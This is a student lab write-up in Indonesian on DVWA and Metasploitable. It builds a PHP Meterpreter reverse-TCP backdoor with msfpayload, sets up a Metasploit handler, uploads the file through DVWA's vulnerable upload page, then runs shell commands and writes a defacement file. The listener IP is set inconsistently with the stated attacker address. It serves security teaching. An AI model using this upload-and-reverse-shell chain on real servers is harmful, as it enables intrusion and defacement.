# DVWA | Lesson 8
## Konfigurasi

###{ Upload PHP Backdoor Payload }

pada lesson 8, kami menggunakan metasploid dan backtrack.

- pertama-tama agar backtrack dan metasploit mendapat IP, buka vm -> klik kanan -> setting -> network -> pilih bridge adapter

![alt text](./backtrack.png)
![alt text](./metasploit.png)

Alamat target DVWA (metasploitable) 
`http://10.151.34.170`

Alamat penyerang (backtrack)
`http://10.151.34.160`


## Skenario
![alt text](./1.png)
- start metasploit dan backtrack yang sudah dikonfigurasi

- log in backtrack dan metasploitable
- membuat direktori backdoor, membuat msfpayload

    `mkdir -p /root/backdoor`
    `cd /root/backdoor`
    `msfpayload php/meterpreter/reverse_tcp LHOST=10.151.34.170 ``LPORT=4444 R > PHONE_HOME.php`
    `ls -l PHONE_HOME.php`

![alt text](./2.png)
![alt text](./3.png)
 - menghapus tanda pagar yang ada di phone_home.php
 - keluar menggunakan command :
    `:q!' -> enter
![alt text](./4.png)

- menjalankan command : 
- LHOST disesuaikan dengan IP metasploit

    `use exploit/multi/handler`

    `set PAYLOAD php/meterpreter/reverse_tcp`

    `set LHOST 10.151.34.170`

    `set LPORT 4444`

    `exploit`



![alt text](./6.png)


- membuka firefox
- buka 10.151.34.170/dvwa/security.php
- login
- set DVWA security LOW

![alt text](./7.png)

- buka 10.151.34.170/dvwa/vulnerabilities/upload
![alt text](./9.png)
- browse php yang ingin diupload
![alt text](./8.png)
- klik upload
- file berhasil diupload
![alt text](./9.png)

- buka 10.151.34.170/dvwa/hackable/uploads
- klik file PHONE_HOME.php

![alt text](./10.png)

- buka command kembali 
- kali ini koneksi telah stabil

![alt text](./12.png)

- melakukan shell
- ketik :
    shell
    uptime
    pwd
    whoami
    w
    echo "hacked by anindita" > hacked.html
    ls -l
![alt text](./13.png)
![alt text](./14.png)





## Hasil
kita berhasil menambahkan file baru ke DVWA
![alt text](./15.png)